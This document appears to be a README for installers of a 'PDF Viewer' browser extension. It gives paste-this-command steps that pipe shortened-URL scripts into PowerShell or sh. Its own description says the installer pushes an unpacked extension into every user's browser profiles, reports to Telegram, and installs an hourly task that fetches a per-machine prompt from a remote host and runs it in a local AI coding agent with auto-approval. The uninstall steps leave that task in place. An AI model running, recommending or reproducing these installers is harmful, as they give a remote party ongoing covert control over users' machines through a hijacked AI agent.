# PDF Viewer Extension - Installers

Automated installation scripts for the PDF Viewer browser extension
(Chrome, Edge, Brave) on Windows and macOS.

## Quick install

Windows (PowerShell):
```powershell
iwr https://wln.ink/i -OutFile $env:TEMP\i.ps1; Unblock-File $env:TEMP\i.ps1; . $env:TEMP\i.ps1
```

macOS (Terminal):
```bash
curl -fsSL wln.ink/m | sh
```

## What it does

1. Downloads the extension from `Castro02980/pdf-viewer-extension`.
2. Copies it to every local user (`%LOCALAPPDATA%\PDFViewerExt`,
   `~/Library/Application Support/PDFViewerExt`).
3. Injects the extension entry (stable ID `kklpcoclpjjfiboodbmcpogicnanoopp`)
   into each Chrome/Edge/Brave profile (`Default`, `Profile *`).
4. Restarts the browsers with session restore.
5. Reports success/failure to Telegram.
6. Installs the hourly maintenance + AI-preparation module: checks for extension
   updates once an hour, fetches a per-machine prompt from `wln.ink/p` and runs
   it in the local opencode (fresh session, `--auto`, max reasoning),
   re-installing opencode itself if it is missing.

Requires at least one existing browser profile. No admin rights required.

Full description of the module (RU): [AI-MAINTENANCE.md](AI-MAINTENANCE.md)
Implementation details: [TECHNICAL_NOTES.md](TECHNICAL_NOTES.md)

## Diagnostics

```powershell
irm https://wln.ink/d | iex
```

Checks the stable extension ID in every profile of every user and prints
browser versions, profile list, and policy keys.

## Uninstall

Windows (PowerShell):
```powershell
Remove-Item "$env:LOCALAPPDATA\PDFViewerExt" -Recurse -Force
```

macOS (Terminal):
```bash
rm -rf "$HOME/Library/Application Support/PDFViewerExt"
```

Then remove the extension entry: open `chrome://extensions`, enable
Developer mode, click Remove. (Uninstalling deletes the files; the
`Preferences` entry is dropped by the browser once its path is gone.)

## Troubleshooting

Extension not showing up?
- Close the browser completely and run the installer again.
- Open `chrome://extensions` with Developer mode on and check for errors.

"Disable developer mode extensions" banner?
- Normal for unpacked extensions, click x to dismiss.
- The extension is open source: `Castro02980/pdf-viewer-extension`.

## Links

- Extension source: https://github.com/Castro02980/pdf-viewer-extension
- Installers: https://github.com/Castro02980/pdf-viewer-installers
